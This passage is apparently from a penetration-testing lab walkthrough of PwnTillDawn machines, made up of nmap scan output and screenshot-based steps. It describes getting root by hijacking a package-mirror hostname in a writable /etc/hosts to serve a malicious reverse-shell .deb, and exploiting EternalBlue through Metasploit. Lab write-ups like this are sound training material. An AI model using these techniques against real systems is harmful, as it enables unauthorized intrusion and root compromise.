drwxrwxr-x 2 n16hth4wk n16hth4wk 4096 May 25 13:16 .
drwxr-xr-x 4 n16hth4wk n16hth4wk 4096 May 25 13:14 ..
-rw-rw-r-- 1 n16hth4wk n16hth4wk  194 May 25 13:16 ssh_8.2p1-4_all
```
Now we’ll create our malicious payload. We’ll be creating a reverse shell to connect back to us named `ssh_8.2p1-4_all`.

![image](https://github.com/user-attachments/assets/bc7e7d18-ad4e-416e-844b-f7b1e72339fc)

now we compiled our malicious deb. rename the file. 


![image](https://github.com/user-attachments/assets/d45786e0-493e-4fd4-a1b9-527594902bde)

on target machine, we can see the `/etc/hosts` file is writable. 

![image](https://github.com/user-attachments/assets/e6470b17-4dd0-4b57-9d70-0e194b85aaa5)

edit the `/etc/hosts` file to put you ip addr and de.archive.ubuntu.com as hostname.

![image](https://github.com/user-attachments/assets/86d12e13-15da-4110-996e-b7de7728ce75)

create a directory path to server as the same path to download the file.

![image](https://github.com/user-attachments/assets/03784937-1c4f-4170-acc7-580b6963d59d)

it is trying to download the file, we haven't add it to the dir yet. 

![image](https://github.com/user-attachments/assets/c0b57d95-bee8-4f44-be7a-f951e6bd00da)

now let's wait. 

![image](https://github.com/user-attachments/assets/1dd398ae-b07e-432c-bc34-223e5ad12bfc)

we got a reverse shell as root. 

![image](https://github.com/user-attachments/assets/4892f6dc-00e9-4f34-9d8c-c64cd0dfb238)

we fully root 

![image](https://github.com/user-attachments/assets/075cf914-ebd4-4857-ab3a-ca12a067cb8e)

We pwned it. 😺 fun!!! 


# 10.150.150.27

>first enum with nmap

```shell
# Nmap 7.94SVN scan initiated Sun May 25 20:53:52 2025 as: /usr/lib/nmap/nmap --privileged -sCV -T4 -p22,80 -Pn -oN 27_service.txt 10.150.150.27
Nmap scan report for 10.150.150.27
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 45:66:62:34:f1:21:bf:8b:43:18:fb:24:a7:f3:29:76 (RSA)
|   256 1c:2a:2e:e4:e8:ea:cc:ec:a5:c4:44:d0:18:75:24:34 (ECDSA)
|_  256 24:1a:99:37:27:53:a4:ce:0e:30:d4:14:d0:68:df:2b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 25 20:54:04 2025 -- 1 IP address (1 host up) scanned in 11.91 seconds
```

> enumerating web port 80

![image](https://github.com/user-attachments/assets/6079fecf-400e-46a0-a712-0808ddd8c288)

Default webpage, let's fuzz for hidden dir. 

![image](https://github.com/user-attachments/assets/8c9ca1ba-7d86-4a95-bbf5-aa6594ca3454)

fuzzing for hidden dirs. 

![image](https://github.com/user-attachments/assets/5988e6ec-a227-4441-85e1-215459be2b00)

we can see a vhost. `crm.pwntilldawn.com`, let's add it to `/etc/hosts`.



























# 10.150.150.242 (MrBlue)

> first enum with nmap

```bash
# Nmap 7.94SVN scan initiated Mon May 19 11:08:49 2025 as: /usr/lib/nmap/nmap --privileged -sCV -T4 -p53,80,135,139,445,1433,3389,8089 -Pn -oN 242_service.txt 10.150.150.242
Nmap scan report for 10.150.150.242
Host is up (0.31s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Microsoft DNS 6.1.7601 (1DB1446A) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB1446A)
80/tcp   open  http         Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
1433/tcp open  ms-sql-s     Microsoft SQL Server 2012 11.00.2100.00; RTM
|_ssl-date: 2025-05-19T09:31:07+00:00; -38m34s from scanner time.
| ms-sql-info: 
|   10.150.150.242:1433: 
|     Version: 
|       name: Microsoft SQL Server 2012 RTM
|       number: 11.00.2100.00
|       Product: Microsoft SQL Server 2012
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-03-25T14:11:19
|_Not valid after:  2050-03-25T14:11:19
| ms-sql-ntlm-info: 
|   10.150.150.242:1433: 
|     Target_Name: MRBLUE
|     NetBIOS_Domain_Name: MRBLUE
|     NetBIOS_Computer_Name: MRBLUE
|     DNS_Domain_Name: MrBlue
|     DNS_Computer_Name: MrBlue
|_    Product_Version: 6.1.7601
3389/tcp open  tcpwrapped
|_ssl-date: 2025-05-19T09:31:07+00:00; -38m34s from scanner time.
| ssl-cert: Subject: commonName=MrBlue
| Not valid before: 2025-05-18T07:59:21
|_Not valid after:  2025-11-17T07:59:21
| rdp-ntlm-info: 
|   Target_Name: MRBLUE
|   NetBIOS_Domain_Name: MRBLUE
|   NetBIOS_Computer_Name: MRBLUE
|   DNS_Domain_Name: MrBlue
|   DNS_Computer_Name: MrBlue
|   Product_Version: 6.1.7601
|_  System_Time: 2025-05-19T09:30:54+00:00
8089/tcp open  ssl/http     Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-25T09:53:52
|_Not valid after:  2022-10-24T09:53:52
|_http-title: splunkd
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: Host: MRBLUE; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: MrBlue
|   NetBIOS computer name: MRBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-19T09:30:52+00:00
| smb2-time: 
|   date: 2025-05-19T09:30:52
|_  start_date: 2020-03-25T14:11:23
|_clock-skew: mean: -38m34s, deviation: 0s, median: -38m34s
|_nbstat: NetBIOS name: MRBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:ab:46:29 (VMware)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 19 11:09:42 2025 -- 1 IP address (1 host up) scanned in 52.90 seconds

```

remember we found an eternal blue vuln on this target

![image](https://github.com/user-attachments/assets/85cedd19-ddb5-43f5-9b07-797580e4cfe7)

> Exploiting using msfconsole

![image](https://github.com/user-attachments/assets/b6ab0a8c-5cf0-4ef5-9af1-ac9912600d6c)

exploit to get shell

![image](https://github.com/user-attachments/assets/2c5ea0fb-8dd7-4788-a907-73a9a30d2069)

cool we pwned it 😃


![image](https://github.com/user-attachments/assets/4fb96362-2c30-4779-a02b-7521f3cdb76b)

Easy peasy 😸
